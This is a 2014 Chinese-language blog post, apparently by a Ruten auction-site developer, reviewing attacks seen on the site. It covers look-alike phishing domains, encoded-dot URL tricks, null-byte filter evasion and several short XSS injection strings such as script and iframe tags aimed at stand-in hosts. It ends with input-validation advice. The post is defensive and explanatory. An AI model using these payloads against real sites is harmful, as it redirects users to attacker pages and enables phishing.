---
title: "XSS Case Study"
date: "2014-06-27 12:00:00"
type: "post"
slug: "xss-case-study"
isCJKLanguage: true
---

## Prologue

在此對我於露天經手過的攻擊案例做一份概略的整理報告。以下列出的攻擊方式不一定會單獨出現，多半都是混合使用

## Cases

### URL Encoded Attack

攻擊者向使用者發送一段訊息，訊息裡夾帶一段類似網址的字串：`www&#46really-bad&#46com`

當使用者讀取到這段訊息，`&#46` 被瀏覽器解碼變成 `.` 之後，顯示出來的就會是 `www.really-bad.com` 這樣完整的網址

其中還有一種變體是針對 [RFC 3490](https://www.ietf.org/rfc/rfc3490.txt) 的實作所進行的攻擊方式：

> Whenever dots are used as label separators, the following characters MUST be recognized as dots: U+002E (full stop), U+3002 (ideographic full stop), U+FF0E (fullwidth full stop), U+FF61 (halfwidth ideographic full stop).

在網址中插入能被轉換為 `.` 的字元，例如 `www。really-bad。com`，這樣也會被瀏覽器解碼為有效的網址：`www.really-bad.com`

### Deceptive Phishing

攻擊者向使用者發送一段訊息，內容含有與露天網址極為相似的假網址：

> 您好，我已經下標了，麻煩確認一下這款是否還有現貨？
>
> http://goods.rutens.com.tw/item/show?12345678901234
>
> 最好可以一起合併結帳，過兩天就去匯款，請核對謝謝！

其中 `goods.rutens.com.tw` 並不是屬於露天的網址，正確的網址應該是 `goods.ruten.com.tw` 才對

而使用者點擊假網址之後，就會被重新導向到攻擊者仿造的露天登入頁面。就算使用者主動檢查登入頁面的網址，也只會看到像是 `http://members.rutens.com.tw/user/login.html` 這樣，與真正的露天登入網址極為相似的假網址

如果沒有非常仔細地檢查的話，很容易就會上當

### Code Injection

出現數量最多的攻擊方式，多半是在 `<form>` 中輸入攻擊字串，然後在使用者接收到 `<form>` 送出的內容後觸發攻擊。舉例來說：

* 將自訂商品分類的名稱命名為 `<script src=//hack.u>`，當使用者開啟賣場首頁時就會觸發，被重新導向到攻擊者的網頁
* 在發送悄悄話時插入 `<iframe src=//devil.c&#99;>` 字串。當使用者要回覆悄悄話時，因為網頁上會顯示引言的關係，所以在瀏覽器讀到攻擊字串後，使用者就會被重新導向到攻擊者的網頁
* 結帳時，在購買人的 email 欄位輸入 `<SCRIPT SRC=bad/url></SCRIPT>` 字串，當使用者查看結帳明細時就會觸發攻擊，被重新導向到攻擊者的網頁

### Control Character Injection

如果過濾規則只能阻擋像是 `www.malicious.com/hack.html` 這種格式的 URL 字串的話，攻擊者可以在字串中塞入 null byte 來騙過過濾規則。例如：`%00www.%00malicious.%00com/%00hack.%00html`

而且這段 URL 仍然可以點擊，或做為重新導向的目標

其他像是 ‍`&#x0200d;` 等 zero width character 也有相同的效果

### Web Parameter Tampering

像 `http://www.dummyurl.com/vulnerable.php?page=4%3Ciframe%20src=http://hack/you%3E` 這樣格式的 URL 就是一個典型的例子

當使用者開啟 `http://www.dummyurl.com/vulnerable.php` 時，如果沒檢查 `$_GET['page']` 的內容，就直接把它顯示在頁面上的話，瀏覽器在讀到 `%3Ciframe%20src=http://hack/you%3E`這一列時，就會跳轉到攻擊者的網頁

## Summary

簡單來說：

1. 不要相信使用者輸入的 **任何** 內容
2. 所有輸入的值 **必須且只能** 是你預期的值

而這二點在實務上會有所取捨，視情況而定

例如，在使用者收到悄悄話時，露天會另外發出一封包含悄悄話內容的通知信到使用者的信箱

此時若是信件內容中含有 code injection 的程式碼，由於各種 mail client 處理信件內容的方式不同，我們也無法預期使用者在打開信件後會發生什麼狀況。考量到開發成本，最後我們決定信件一律只包含固定內容的提示訊息。如果使用者要查看悄悄話的內容，再透過信件中的連結回到露天的網站查閱就好

以這個案例來說，就根本不用考慮「要怎麼處理信件中的字串」這種問題了

## Solutions

### PHP

* 常用的有 [`htmlentities`](http://php.net/manual/en/function.htmlentities.php) 和 [`htmlspecialchars`](http://www.php.net/manual/en/function.htmlspecialchars.php) 等
* 自 PHP 5.2 起還多了 [filter](http://www.php.net/manual/en/book.filter.php) 系列的 function，可以參考使用
* 或是使用露天自訂的 class `ParseInput` 與 `UString` 等
